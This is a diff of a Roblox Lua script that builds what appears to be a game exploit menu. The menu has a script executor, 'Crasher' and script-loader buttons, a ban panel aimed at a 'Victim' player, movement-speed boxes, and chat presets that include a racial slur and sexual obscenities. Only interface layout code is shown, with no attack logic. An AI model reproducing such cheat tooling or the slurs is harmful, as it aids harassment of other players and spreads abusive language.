@@ -31,96 +31,101 @@ local UICorner_6 = Instance.new("UICorner")
 local ImageLabel_8 = Instance.new("ImageLabel")
 local mainsecotin = Instance.new("Frame")
 local UICorner_7 = Instance.new("UICorner")
-local codeditor = Instance.new("Frame")
-local codeditorsw = Instance.new("ScrollingFrame")
-local codebox = Instance.new("TextBox")
-local Execute = Instance.new("TextButton")
-local UICorner_8 = Instance.new("UICorner")
-local CClear = Instance.new("TextButton")
-local UICorner_9 = Instance.new("UICorner")
-local mscripts = Instance.new("ImageButton")
-local UICorner_10 = Instance.new("UICorner")
-local mscrip = Instance.new("Frame")
-local msbg = Instance.new("Frame")
-local UICorner_11 = Instance.new("UICorner")
-local sfmsg = Instance.new("ScrollingFrame")
-local IY = Instance.new("ImageLabel")
-local runiy = Instance.new("TextButton")
-local UICorner_12 = Instance.new("UICorner")
-local UICorner_13 = Instance.new("UICorner")
-local c4bh = Instance.new("ImageLabel")
-local UICorner_14 = Instance.new("UICorner")
-local runc4bh = Instance.new("TextButton")
-local UICorner_15 = Instance.new("UICorner")
-local UICorner_16 = Instance.new("UICorner")
 local character = Instance.new("Frame")
 local speed = Instance.new("TextLabel")
-local UICorner_17 = Instance.new("UICorner")
+local UICorner_8 = Instance.new("UICorner")
 local sped = Instance.new("TextBox")
-local UICorner_18 = Instance.new("UICorner")
+local UICorner_9 = Instance.new("UICorner")
 local jp = Instance.new("TextLabel")
-local UICorner_19 = Instance.new("UICorner")
+local UICorner_10 = Instance.new("UICorner")
 local jpower = Instance.new("TextBox")
-local UICorner_20 = Instance.new("UICorner")
+local UICorner_11 = Instance.new("UICorner")
 local use = Instance.new("TextButton")
-local UICorner_21 = Instance.new("UICorner")
+local UICorner_12 = Instance.new("UICorner")
 local whispa = Instance.new("TextBox")
 local TextBox = Instance.new("TextBox")
-local UICorner_22 = Instance.new("UICorner")
+local UICorner_13 = Instance.new("UICorner")
 local TextButton = Instance.new("TextButton")
-local UICorner_23 = Instance.new("UICorner")
+local UICorner_14 = Instance.new("UICorner")
 local ImageLabel_9 = Instance.new("ImageLabel")
 local cchat = Instance.new("TextButton")
-local UICorner_24 = Instance.new("UICorner")
-local UICorner_25 = Instance.new("UICorner")
+local UICorner_15 = Instance.new("UICorner")
+local UICorner_16 = Instance.new("UICorner")
 local title = Instance.new("TextButton")
-local UICorner_26 = Instance.new("UICorner")
+local UICorner_17 = Instance.new("UICorner")
 local swearwords = Instance.new("Frame")
-local UICorner_27 = Instance.new("UICorner")
+local UICorner_18 = Instance.new("UICorner")
 local bg = Instance.new("Frame")
-local UICorner_28 = Instance.new("UICorner")
+local UICorner_19 = Instance.new("UICorner")
 local ScrollingFrame_2 = Instance.new("ScrollingFrame")
 local UIListLayout_2 = Instance.new("UIListLayout")
 local bgnotouch = Instance.new("Frame")
 local as = Instance.new("TextButton")
-local UICorner_29 = Instance.new("UICorner")
+local UICorner_20 = Instance.new("UICorner")
 local ashole = Instance.new("TextButton")
-local UICorner_30 = Instance.new("UICorner")
+local UICorner_21 = Instance.new("UICorner")
 local nega = Instance.new("TextButton")
-local UICorner_31 = Instance.new("UICorner")
+local UICorner_22 = Instance.new("UICorner")
 local icome = Instance.new("TextButton")
-local UICorner_32 = Instance.new("UICorner")
+local UICorner_23 = Instance.new("UICorner")
 local bitkh = Instance.new("TextButton")
-local UICorner_33 = Instance.new("UICorner")
+local UICorner_24 = Instance.new("UICorner")
 local shitt = Instance.new("TextButton")
-local UICorner_34 = Instance.new("UICorner")
+local UICorner_25 = Instance.new("UICorner")
 local BELLEND = Instance.new("TextButton")
-local UICorner_35 = Instance.new("UICorner")
+local UICorner_26 = Instance.new("UICorner")
 local _10vepp = Instance.new("TextButton")
-local UICorner_36 = Instance.new("UICorner")
+local UICorner_27 = Instance.new("UICorner")
 local m4gbans = Instance.new("ScrollingFrame")
 local Mods4Game = Instance.new("TextButton")
-local UICorner_37 = Instance.new("UICorner")
+local UICorner_28 = Instance.new("UICorner")
 local ClearBANS = Instance.new("TextButton")
-local UICorner_38 = Instance.new("UICorner")
+local UICorner_29 = Instance.new("UICorner")
 local tgp = Instance.new("TextLabel")
-local UICorner_39 = Instance.new("UICorner")
+local UICorner_30 = Instance.new("UICorner")
 local gameversion = Instance.new("TextLabel")
-local UICorner_40 = Instance.new("UICorner")
+local UICorner_31 = Instance.new("UICorner")
 local ban = Instance.new("TextButton")
-local UICorner_41 = Instance.new("UICorner")
+local UICorner_32 = Instance.new("UICorner")
 local Victim = Instance.new("TextBox")
-local UICorner_42 = Instance.new("UICorner")
+local UICorner_33 = Instance.new("UICorner")
 local reason = Instance.new("TextBox")
-local UICorner_43 = Instance.new("UICorner")
+local UICorner_34 = Instance.new("UICorner")
 local BanUser = Instance.new("TextButton")
 local runban = Instance.new("ImageLabel")
-local UICorner_44 = Instance.new("UICorner")
+local UICorner_35 = Instance.new("UICorner")
 local runbanbg = Instance.new("ImageLabel")
+local codeditor = Instance.new("Frame")
+local codeditorsw = Instance.new("ScrollingFrame")
+local codebox = Instance.new("TextBox")
+local Execute = Instance.new("TextButton")
+local UICorner_36 = Instance.new("UICorner")
+local CClear = Instance.new("TextButton")
+local UICorner_37 = Instance.new("UICorner")
+local mscripts = Instance.new("ImageButton")
+local UICorner_38 = Instance.new("UICorner")
+local mscrip = Instance.new("Frame")
+local msbg = Instance.new("Frame")
+local UICorner_39 = Instance.new("UICorner")
+local sfmsg = Instance.new("ScrollingFrame")
+local IY = Instance.new("ImageLabel")
+local runiy = Instance.new("TextButton")
+local UICorner_40 = Instance.new("UICorner")
+local UICorner_41 = Instance.new("UICorner")
+local c4bh = Instance.new("ImageLabel")
+local UICorner_42 = Instance.new("UICorner")
+local runc4bh = Instance.new("TextButton")
+local UICorner_43 = Instance.new("UICorner")
+local Crasher = Instance.new("ImageLabel")
+local UICorner_44 = Instance.new("UICorner")
+local runc4bh_2 = Instance.new("TextButton")
 local UICorner_45 = Instance.new("UICorner")
-local BGTheme = Instance.new("ImageLabel")
+local TextLabel = Instance.new("TextLabel")
 local UICorner_46 = Instance.new("UICorner")
 local UICorner_47 = Instance.new("UICorner")
+local BGTheme = Instance.new("ImageLabel")
+local UICorner_48 = Instance.new("UICorner")
+local UICorner_49 = Instance.new("UICorner")
 
 --Properties:
 
@@ -394,6 +399,566 @@ mainsecotin.Size = UDim2.new(0, 344, 0, 147)
 
 UICorner_7.Parent = mainsecotin
 
+character.Name = "character"
+character.Parent = mainsecotin
+character.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+character.BackgroundTransparency = 1.000
+character.BorderColor3 = Color3.fromRGB(0, 0, 0)
+character.BorderSizePixel = 0
+character.Size = UDim2.new(0, 1, 0, 1)
+character.Visible = false
+
+speed.Name = "speed"
+speed.Parent = character
+speed.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+speed.BackgroundTransparency = 0.150
+speed.BorderColor3 = Color3.fromRGB(0, 0, 0)
+speed.BorderSizePixel = 0
+speed.Position = UDim2.new(13, 0, 18, 0)
+speed.Size = UDim2.new(0, 176, 0, 39)
+speed.Font = Enum.Font.SourceSansBold
+speed.Text = "Speed"
+speed.TextColor3 = Color3.fromRGB(141, 174, 176)
+speed.TextScaled = true
+speed.TextSize = 14.000
+speed.TextWrapped = true
+
+UICorner_8.Parent = speed
+
+sped.Name = "sped"
+sped.Parent = speed
+sped.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+sped.BackgroundTransparency = 0.300
+sped.BorderColor3 = Color3.fromRGB(0, 0, 0)
+sped.BorderSizePixel = 0
+sped.Position = UDim2.new(1.10227275, 0, 0, 0)
+sped.Size = UDim2.new(0, 126, 0, 39)
+sped.Font = Enum.Font.SourceSans
+sped.Text = "16"
+sped.TextColor3 = Color3.fromRGB(0, 0, 0)
+sped.TextSize = 14.000
+
+UICorner_9.Parent = sped
+
+jp.Name = "jp"
+jp.Parent = character
+jp.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+jp.BackgroundTransparency = 0.150
+jp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+jp.BorderSizePixel = 0
+jp.Position = UDim2.new(13, 0, 83, 0)
+jp.Size = UDim2.new(0, 176, 0, 39)
+jp.Font = Enum.Font.SourceSansBold
+jp.Text = "Jump Power"
+jp.TextColor3 = Color3.fromRGB(141, 174, 176)
+jp.TextSize = 32.000
+jp.TextWrapped = true
+
+UICorner_10.Parent = jp
+
+jpower.Name = "jpower"
+jpower.Parent = jp
+jpower.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+jpower.BackgroundTransparency = 0.300
+jpower.BorderColor3 = Color3.fromRGB(0, 0, 0)
+jpower.BorderSizePixel = 0
+jpower.Position = UDim2.new(1.10227275, 0, 0, 0)
+jpower.Size = UDim2.new(0, 126, 0, 39)
+jpower.Font = Enum.Font.SourceSans
+jpower.Text = "7.2"
+jpower.TextColor3 = Color3.fromRGB(0, 0, 0)
+jpower.TextSize = 14.000
+
+UICorner_11.Parent = jpower
+
+use.Name = "use"
+use.Parent = character
+use.BackgroundColor3 = Color3.fromRGB(125, 154, 156)
+use.BackgroundTransparency = 0.250
+use.BorderColor3 = Color3.fromRGB(0, 0, 0)
+use.BorderSizePixel = 0
+use.Position = UDim2.new(88, 0, 137.765015, 0)
+use.Size = UDim2.new(0, 167, 0, 34)
+use.Font = Enum.Font.SourceSansBold
+use.Text = "Apply"
+use.TextColor3 = Color3.fromRGB(39, 65, 66)
+use.TextScaled = true
+use.TextSize = 14.000
+use.TextStrokeColor3 = Color3.fromRGB(163, 163, 163)
+use.TextStrokeTransparency = 0.000
+use.TextWrapped = true
+
+UICorner_12.Parent = use
+
+whispa.Name = "whispa"
+whispa.Parent = mainsecotin
+whispa.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+whispa.BackgroundTransparency = 0.100
+whispa.BorderColor3 = Color3.fromRGB(0, 0, 0)
+whispa.BorderSizePixel = 0
+whispa.Position = UDim2.new(0.0559008382, 0, 0.129251704, 0)
+whispa.Size = UDim2.new(0, 175, 0, 31)
+whispa.Font = Enum.Font.SourceSansBold
+whispa.PlaceholderColor3 = Color3.fromRGB(102, 178, 113)
+whispa.PlaceholderText = "Whisper"
+whispa.Text = ""
+whispa.TextColor3 = Color3.fromRGB(0, 0, 0)
+whispa.TextScaled = true
+whispa.TextSize = 14.000
+whispa.TextWrapped = true
+
+TextBox.Parent = whispa
+TextBox.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+TextBox.BackgroundTransparency = 0.100
+TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextBox.BorderSizePixel = 0
+TextBox.Position = UDim2.new(-0.00345824566, 0, 1.51861966, 0)
+TextBox.Size = UDim2.new(0, 255, 0, 71)
+TextBox.ZIndex = 2
+TextBox.ClearTextOnFocus = false
+TextBox.Font = Enum.Font.SourceSansBold
+TextBox.MultiLine = true
+TextBox.PlaceholderColor3 = Color3.fromRGB(102, 178, 113)
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(207, 207, 207)
+TextBox.TextSize = 18.000
+TextBox.TextWrapped = true
+TextBox.TextXAlignment = Enum.TextXAlignment.Left
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+
+UICorner_13.CornerRadius = UDim.new(0, 5)
+UICorner_13.Parent = TextBox
+
+TextButton.Parent = TextBox
+TextButton.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+TextButton.BackgroundTransparency = 0.100
+TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.BorderSizePixel = 0
+TextButton.Position = UDim2.new(1.03499997, 0, -0.0199999996, 0)
+TextButton.Size = UDim2.new(0, 46, 0, 46)
+TextButton.Font = Enum.Font.SourceSans
+TextButton.Text = ""
+TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextButton.TextSize = 14.000
+TextButton.TextWrapped = true
+
+UICorner_14.CornerRadius = UDim.new(0, 5)
+UICorner_14.Parent = TextButton
+
+ImageLabel_9.Parent = TextButton
+ImageLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel_9.BackgroundTransparency = 1.000
+ImageLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ImageLabel_9.BorderSizePixel = 0
+ImageLabel_9.Position = UDim2.new(0.130434781, 0, 0.0652154014, 0)
+ImageLabel_9.Size = UDim2.new(0, 40, 0, 40)
+ImageLabel_9.Image = "rbxassetid://12099513379"
+ImageLabel_9.ImageColor3 = Color3.fromRGB(208, 202, 213)
+ImageLabel_9.ImageTransparency = 0.300
+
+cchat.Name = "cchat"
+cchat.Parent = TextBox
+cchat.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+cchat.BackgroundTransparency = 0.100
+cchat.BorderColor3 = Color3.fromRGB(0, 0, 0)
+cchat.BorderSizePixel = 0
+cchat.Position = UDim2.new(1.03299999, 0, 0.728999972, 0)
+cchat.Size = UDim2.new(0, 47, 0, 19)
+cchat.Font = Enum.Font.SourceSansBold
+cchat.Text = "Clear Box"
+cchat.TextColor3 = Color3.fromRGB(0, 0, 0)
+cchat.TextScaled = true
+cchat.TextSize = 14.000
+cchat.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+cchat.TextStrokeTransparency = 0.600
+cchat.TextWrapped = true
+
+UICorner_15.CornerRadius = UDim.new(0, 5)
+UICorner_15.Parent = cchat
+
+UICorner_16.Parent = whispa
+
+title.Name = "title"
+title.Parent = whispa
+title.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+title.BackgroundTransparency = 0.100
+title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+title.BorderSizePixel = 0
+title.Position = UDim2.new(1.046, 0, -0.225999996, 0)
+title.Size = UDim2.new(0, 123, 0, 44)
+title.ZIndex = 2
+title.Font = Enum.Font.SourceSansBold
+title.Text = "Chat"
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.TextScaled = true
+title.TextSize = 14.000
+title.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+title.TextStrokeTransparency = 0.000
+title.TextWrapped = true
+
+UICorner_17.Parent = title
+
+swearwords.Name = "swearwords"
+swearwords.Parent = title
+swearwords.BackgroundColor3 = Color3.fromRGB(15, 38, 37)
+swearwords.BackgroundTransparency = 0.200
+swearwords.BorderColor3 = Color3.fromRGB(0, 0, 0)
+swearwords.BorderSizePixel = 0
+swearwords.Position = UDim2.new(1.33333337, 0, -0.5, 0)
+swearwords.Size = UDim2.new(0, 100, 0, 120)
+swearwords.Visible = false
+
+UICorner_18.Parent = swearwords
+
+bg.Name = "bg"
+bg.Parent = swearwords
+bg.BackgroundColor3 = Color3.fromRGB(15, 38, 37)
+bg.BackgroundTransparency = 0.200
+bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
+bg.BorderSizePixel = 0
+bg.ClipsDescendants = true
+bg.Position = UDim2.new(0.0799999982, 0, 0.100060426, 0)
+bg.Size = UDim2.new(0, 84, 0, 102)
+
+UICorner_19.Parent = bg
+
+ScrollingFrame_2.Parent = bg
+ScrollingFrame_2.Active = true
+ScrollingFrame_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame_2.BackgroundTransparency = 1.000
+ScrollingFrame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScrollingFrame_2.BorderSizePixel = 0
+ScrollingFrame_2.Size = UDim2.new(0, 84, 0, 102)
+ScrollingFrame_2.ScrollBarThickness = 8
+
+UIListLayout_2.Parent = ScrollingFrame_2
+UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
+UIListLayout_2.Padding = UDim.new(0.0350000001, 0)
+
+bgnotouch.Name = "bgnotouch"
+bgnotouch.Parent = ScrollingFrame_2
+bgnotouch.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+bgnotouch.BorderColor3 = Color3.fromRGB(0, 0, 0)
+bgnotouch.BorderSizePixel = 0
+bgnotouch.Position = UDim2.new(0.0714285746, 0, 0, 0)
+
+as.Name = "[as]"
+as.Parent = ScrollingFrame_2
+as.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+as.BackgroundTransparency = 0.100
+as.BorderColor3 = Color3.fromRGB(0, 0, 0)
+as.BorderSizePixel = 0
+as.Size = UDim2.new(0, 72, 0, 18)
+as.Font = Enum.Font.SourceSansBold
+as.Text = "Ass"
+as.TextColor3 = Color3.fromRGB(0, 0, 0)
+as.TextScaled = true
+as.TextSize = 14.000
+as.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+as.TextStrokeTransparency = 0.000
+as.TextWrapped = true
+
+UICorner_20.Parent = as
+
+ashole.Name = "[as]hole"
+ashole.Parent = ScrollingFrame_2
+ashole.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+ashole.BackgroundTransparency = 0.100
+ashole.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ashole.BorderSizePixel = 0
+ashole.Size = UDim2.new(0, 72, 0, 18)
+ashole.Font = Enum.Font.SourceSansBold
+ashole.Text = "Asshole"
+ashole.TextColor3 = Color3.fromRGB(0, 0, 0)
+ashole.TextScaled = true
+ashole.TextSize = 14.000
+ashole.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+ashole.TextStrokeTransparency = 0.000
+ashole.TextWrapped = true
+
+UICorner_21.Parent = ashole
+
+nega.Name = "nega"
+nega.Parent = ScrollingFrame_2
+nega.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+nega.BackgroundTransparency = 0.100
+nega.BorderColor3 = Color3.fromRGB(0, 0, 0)
+nega.BorderSizePixel = 0
+nega.Size = UDim2.new(0, 72, 0, 18)
+nega.Font = Enum.Font.SourceSansBold
+nega.Text = "Nigga"
+nega.TextColor3 = Color3.fromRGB(0, 0, 0)
+nega.TextScaled = true
+nega.TextSize = 14.000
+nega.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+nega.TextStrokeTransparency = 0.000
+nega.TextWrapped = true
+
+UICorner_22.Parent = nega
+
+icome.Name = "icome"
+icome.Parent = ScrollingFrame_2
+icome.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+icome.BackgroundTransparency = 0.100
+icome.BorderColor3 = Color3.fromRGB(0, 0, 0)
+icome.BorderSizePixel = 0
+icome.Size = UDim2.new(0, 72, 0, 18)
+icome.Font = Enum.Font.SourceSansBold
+icome.Text = "i CUMMED"
+icome.TextColor3 = Color3.fromRGB(0, 0, 0)
+icome.TextScaled = true
+icome.TextSize = 14.000
+icome.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+icome.TextStrokeTransparency = 0.000
+icome.TextWrapped = true
+
+UICorner_23.Parent = icome
+
+bitkh.Name = "bitkh"
+bitkh.Parent = ScrollingFrame_2
+bitkh.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+bitkh.BackgroundTransparency = 0.100
+bitkh.BorderColor3 = Color3.fromRGB(0, 0, 0)
+bitkh.BorderSizePixel = 0
+bitkh.Size = UDim2.new(0, 72, 0, 18)
+bitkh.Font = Enum.Font.SourceSansBold
+bitkh.Text = "Bitch"
+bitkh.TextColor3 = Color3.fromRGB(0, 0, 0)
+bitkh.TextScaled = true
+bitkh.TextSize = 14.000
+bitkh.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+bitkh.TextStrokeTransparency = 0.000
+bitkh.TextWrapped = true
+
+UICorner_24.Parent = bitkh
+
+shitt.Name = "shitt"
+shitt.Parent = ScrollingFrame_2
+shitt.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+shitt.BackgroundTransparency = 0.100
+shitt.BorderColor3 = Color3.fromRGB(0, 0, 0)
+shitt.BorderSizePixel = 0
+shitt.Size = UDim2.new(0, 72, 0, 18)
+shitt.Font = Enum.Font.SourceSansBold
+shitt.Text = "Shit"
+shitt.TextColor3 = Color3.fromRGB(0, 0, 0)
+shitt.TextScaled = true
+shitt.TextSize = 14.000
+shitt.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+shitt.TextStrokeTransparency = 0.000
+shitt.TextWrapped = true
+
+UICorner_25.Parent = shitt
+
+BELLEND.Name = "BELLEND"
+BELLEND.Parent = ScrollingFrame_2
+BELLEND.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+BELLEND.BackgroundTransparency = 0.100
+BELLEND.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BELLEND.BorderSizePixel = 0
+BELLEND.Size = UDim2.new(0, 72, 0, 18)
+BELLEND.Font = Enum.Font.SourceSansBold
+BELLEND.Text = "Bellend"
+BELLEND.TextColor3 = Color3.fromRGB(0, 0, 0)
+BELLEND.TextScaled = true
+BELLEND.TextSize = 14.000
+BELLEND.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+BELLEND.TextStrokeTransparency = 0.000
+BELLEND.TextWrapped = true
+
+UICorner_26.Parent = BELLEND
+
+_10vepp.Name = "10vepp"
+_10vepp.Parent = ScrollingFrame_2
+_10vepp.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+_10vepp.BackgroundTransparency = 0.100
+_10vepp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+_10vepp.BorderSizePixel = 0
+_10vepp.Size = UDim2.new(0, 72, 0, 18)
+_10vepp.Font = Enum.Font.SourceSansBold
+_10vepp.Text = "i love cocks"
+_10vepp.TextColor3 = Color3.fromRGB(0, 0, 0)
+_10vepp.TextSize = 16.000
+_10vepp.TextStrokeColor3 = Color3.fromRGB(80, 113, 138)
+_10vepp.TextStrokeTransparency = 0.000
+_10vepp.TextWrapped = true
+
+UICorner_27.Parent = _10vepp
+
+m4gbans.Name = "m4g / bans..."
+m4gbans.Parent = mainsecotin
+m4gbans.Active = true
+m4gbans.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+m4gbans.BackgroundTransparency = 1.000
+m4gbans.BorderColor3 = Color3.fromRGB(0, 0, 0)
+m4gbans.BorderSizePixel = 0
+m4gbans.Size = UDim2.new(0, 344, 0, 147)
+m4gbans.Visible = false
+
+Mods4Game.Name = "Mods4Game"
+Mods4Game.Parent = m4gbans
+Mods4Game.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+Mods4Game.BackgroundTransparency = 0.100
+Mods4Game.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Mods4Game.BorderSizePixel = 0
+Mods4Game.Position = UDim2.new(0.0410000011, 0, 0.0850000009, 0)
+Mods4Game.Size = UDim2.new(0, 131, 0, 33)
+Mods4Game.Font = Enum.Font.SourceSansBold
+Mods4Game.Text = "Extra Map"
+Mods4Game.TextColor3 = Color3.fromRGB(102, 178, 113)
+Mods4Game.TextScaled = true
+Mods4Game.TextSize = 14.000
+Mods4Game.TextWrapped = true
+
+UICorner_28.Parent = Mods4Game
+
+ClearBANS.Name = "ClearBANS"
+ClearBANS.Parent = Mods4Game
+ClearBANS.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+ClearBANS.BackgroundTransparency = 0.100
+ClearBANS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ClearBANS.BorderSizePixel = 0
+ClearBANS.Position = UDim2.new(-0.00510365749, 0, 1.77241838, 0)
+ClearBANS.Size = UDim2.new(0, 131, 0, 33)
+ClearBANS.Font = Enum.Font.SourceSansBold
+ClearBANS.Text = "Clear Ban Texts"
+ClearBANS.TextColor3 = Color3.fromRGB(178, 99, 99)
+ClearBANS.TextScaled = true
+ClearBANS.TextSize = 14.000
+ClearBANS.TextWrapped = true
+
+UICorner_29.Parent = ClearBANS
+
+tgp.Name = "tgp"
+tgp.Parent = Mods4Game
+tgp.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+tgp.BackgroundTransparency = 0.100
+tgp.BorderColor3 = Color3.fromRGB(0, 0, 0)
+tgp.BorderSizePixel = 0
+tgp.Position = UDim2.new(1.2061069, 0, -0.272727281, 0)
+tgp.Size = UDim2.new(0, 154, 0, 35)
+tgp.Font = Enum.Font.SourceSansBold
+tgp.Text = "Total Game Parts :"
+tgp.TextColor3 = Color3.fromRGB(154, 170, 101)
+tgp.TextScaled = true
+tgp.TextSize = 14.000
+tgp.TextWrapped = true
+
+UICorner_30.Parent = tgp
+
+gameversion.Name = "gameversion"
+gameversion.Parent = Mods4Game
+gameversion.BackgroundColor3 = Color3.fromRGB(47, 79, 81)
+gameversion.BackgroundTransparency = 0.100
+gameversion.BorderColor3 = Color3.fromRGB(0, 0, 0)
+gameversion.BorderSizePixel = 0
+gameversion.Position = UDim2.new(1.2061069, 0, 1.21212304, 0)
+gameversion.Size = UDim2.new(0, 154, 0, 51)
+gameversion.Font = Enum.Font.SourceSansBold
+gameversion.Text = ""
+gameversion.TextColor3 = Color3.fromRGB(154, 170, 101)
+gameversion.TextScaled = true
+gameversion.TextSize = 14.000
+gameversion.TextWrapped = true
+
+UICorner_31.Parent = gameversion
+
+ban.Name = "ban."
+ban.Parent = m4gbans
+ban.BackgroundColor3 = Color3.fromRGB(55, 92, 94)
+ban.BackgroundTransparency = 0.100
+ban.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ban.BorderSizePixel = 0
+ban.Position = UDim2.new(0.550000012, 0, 0.550000012, 0)
+ban.Size = UDim2.new(0, 125, 0, 50)
+ban.Font = Enum.Font.SourceSansBold
+ban.Text = "Current ban Method: Teleport"
+ban.TextColor3 = Color3.fromRGB(165, 124, 108)
+ban.TextScaled = true
+ban.TextSize = 20.000
+ban.TextWrapped = true
+
+UICorner_32.Parent = ban
+
+Victim.Name = "Victim."
+Victim.Parent = ban
+Victim.BackgroundColor3 = Color3.fromRGB(55, 92, 94)
+Victim.BackgroundTransparency = 0.100
+Victim.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Victim.BorderSizePixel = 0
+Victim.Position = UDim2.new(-1.40799999, 0, 0, 0)
+Victim.Size = UDim2.new(0, 158, 0, 50)
+Victim.ClearTextOnFocus = false
+Victim.Font = Enum.Font.SourceSansBold
+Victim.PlaceholderColor3 = Color3.fromRGB(145, 89, 89)
+Victim.PlaceholderText = "Vicitm"
+Victim.Text = ""
+Victim.TextColor3 = Color3.fromRGB(0, 0, 0)
+Victim.TextScaled = true
+Victim.TextSize = 14.000
+Victim.TextWrapped = true
+
+UICorner_33.Parent = Victim
+
+reason.Name = "reason."
+reason.Parent = ban
+reason.BackgroundColor3 = Color3.fromRGB(55, 92, 94)
+reason.BackgroundTransparency = 0.100
+reason.BorderColor3 = Color3.fromRGB(0, 0, 0)
+reason.BorderSizePixel = 0
+reason.Position = UDim2.new(-1.31200004, 0, 1.27999997, 0)
+reason.Size = UDim2.new(0, 229, 0, 56)
+reason.Font = Enum.Font.SourceSansBold
+reason.PlaceholderColor3 = Color3.fromRGB(132, 69, 69)
+reason.PlaceholderText = "Reason for ban"
+reason.Text = ""
+reason.TextColor3 = Color3.fromRGB(0, 0, 0)
+reason.TextScaled = true
+reason.TextSize = 14.000
+reason.TextStrokeTransparency = 0.500
+reason.TextWrapped = true
+
+UICorner_34.Parent = reason
+
+BanUser.Name = "BanUser"
+BanUser.Parent = ban
+BanUser.BackgroundColor3 = Color3.fromRGB(63, 105, 107)
+BanUser.BackgroundTransparency = 0.100
+BanUser.BorderColor3 = Color3.fromRGB(0, 0, 0)
+BanUser.BorderSizePixel = 0
+BanUser.Position = UDim2.new(0.600000024, 0, 1.34000003, 0)
+BanUser.Size = UDim2.new(0, 50, 0, 50)
+BanUser.Font = Enum.Font.SourceSans
+BanUser.Text = ""
+BanUser.TextColor3 = Color3.fromRGB(0, 0, 0)
+BanUser.TextSize = 14.000
+
+runban.Name = "runban."
+runban.Parent = BanUser
+runban.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+runban.BackgroundTransparency = 1.000
+runban.BorderColor3 = Color3.fromRGB(0, 0, 0)
+runban.BorderSizePixel = 0
+runban.Position = UDim2.new(0.0799999982, 0, 0.0599999987, 0)
+runban.Size = UDim2.new(0, 44, 0, 44)
+runban.Image = "rbxassetid://12099513379"
+runban.ImageColor3 = Color3.fromRGB(208, 202, 213)
+
+UICorner_35.Parent = BanUser
+
+runbanbg.Name = "runbanbg."
+runbanbg.Parent = BanUser
+runbanbg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+runbanbg.BackgroundTransparency = 1.000
+runbanbg.BorderColor3 = Color3.fromRGB(0, 0, 0)
+runbanbg.BorderSizePixel = 0
+runbanbg.Position = UDim2.new(0.119999997, 0, 0.119999997, 0)
+runbanbg.Size = UDim2.new(0, 38, 0, 38)
+runbanbg.Image = "rbxassetid://12099513379"
+runbanbg.ImageColor3 = Color3.fromRGB(163, 45, 45)
+runbanbg.ImageTransparency = 1.000
+
 codeditor.Name = "codeditor"
 codeditor.Parent = mainsecotin
 codeditor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -450,7 +1015,7 @@ Execute.TextSize = 14.000
 Execute.TextStrokeTransparency = 0.000
 Execute.TextWrapped = true
 
-UICorner_8.Parent = Execute
+UICorner_36.Parent = Execute
 
 CClear.Name = "CClear"
 CClear.Parent = codeditor
@@ -468,7 +1033,7 @@ CClear.TextSize = 14.000
 CClear.TextStrokeTransparency = 0.000
 CClear.TextWrapped = true
 
-UICorner_9.Parent = CClear
+UICorner_37.Parent = CClear
 
 mscripts.Name = "mscripts"
 mscripts.Parent = codeditor
@@ -481,7 +1046,7 @@ mscripts.Size = UDim2.new(0, 33, 0, 26)
 mscripts.Image = "rbxassetid://4034483344"
 mscripts.ImageColor3 = Color3.fromRGB(141, 174, 176)
 
-UICorner_10.Parent = mscripts
+UICorner_38.Parent = mscripts
 
 mscrip.Name = "mscrip"
 mscrip.Parent = mscripts
@@ -502,7 +1067,7 @@ msbg.BorderSizePixel = 0
